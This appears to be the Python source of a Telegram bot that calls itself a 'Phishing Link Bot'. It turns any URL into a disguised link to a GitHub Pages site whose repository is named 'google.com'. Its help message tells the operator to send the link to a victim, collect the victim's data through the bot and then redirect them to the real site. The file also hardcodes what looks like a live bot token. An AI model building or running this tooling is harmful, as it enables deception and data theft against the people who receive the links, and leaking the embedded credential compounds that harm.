import telebot
import urllib.parse
import secrets

BOT_TOKEN = "8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco"
GITHUB_USERNAME = "anonymousyasir04"
REPO_NAME = "google.com"

bot = telebot.TeleBot(BOT_TOKEN)

def generate_link(target_url):
    encoded = urllib.parse.quote(target_url, safe='')
    return f"https://{GITHUB_USERNAME}.github.io/{REPO_NAME}/?url={encoded}"

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn1 = telebot.types.InlineKeyboardButton("📱 Create Link", callback_data="create")
    btn2 = telebot.types.InlineKeyboardButton("🛠️ Help", callback_data="help")
    markup.add(btn1, btn2)
    
    bot.reply_to(message, 
        "👋 Welcome! I'm Phishing Link Bot\n\n"
        "Send me any URL to create phishing link!\n\n"
        "Commands:\n"
        "/start - Show menu\n"
        "/make - Create link\n"
        "/help - Get help", 
        reply_markup=markup
    )

@bot.message_handler(commands=['make', 'create'])
def make(message):
    bot.reply_to(message, "🔗 Send me any URL (YouTube, Google, etc.)")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message,
        "🛠️ HOW TO USE:\n\n"
        "1. Send URL to bot\n"
        "2. Get phishing link\n"
        "3. Send to victim\n"
        "4. Data collected & sent here\n"
        "5. Victim redirected to real site"
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "create":
        bot.send_message(call.message.chat.id, "Send me any URL...")
    elif call.data == "help":
        bot.send_message(call.message.chat.id, 
            "Help: Send any URL to create phishing link")

@bot.message_handler(func=lambda message: True)
def handle_url(message):
    url = message.text.strip()
    if not url.startswith('http'):
        url = 'https://' + url
    
    phishing_link = generate_link(url)
    
    # Create buttons
    markup = telebot.types.InlineKeyboardMarkup()
    btn1 = telebot.types.InlineKeyboardButton("📱 Test Link", url=phishing_link)
    btn2 = telebot.types.InlineKeyboardButton("🔄 New", callback_data="new")
    markup.add(btn1, btn2)
    
    response = f"""
✅ LINK GENERATED

🎯 Target: {url}

🔗 Your Link:
{phishing_link}

📊 ID: {secrets.token_hex(6)}
    """
    
    bot.reply_to(message, response, reply_markup=markup, disable_web_page_preview=True)

if __name__ == '__main__':
    print("Bot is running...")
    print(f"📁 Your phishing page: https://{GITHUB_USERNAME}.github.io/{REPO_NAME}/")
    bot.polling()
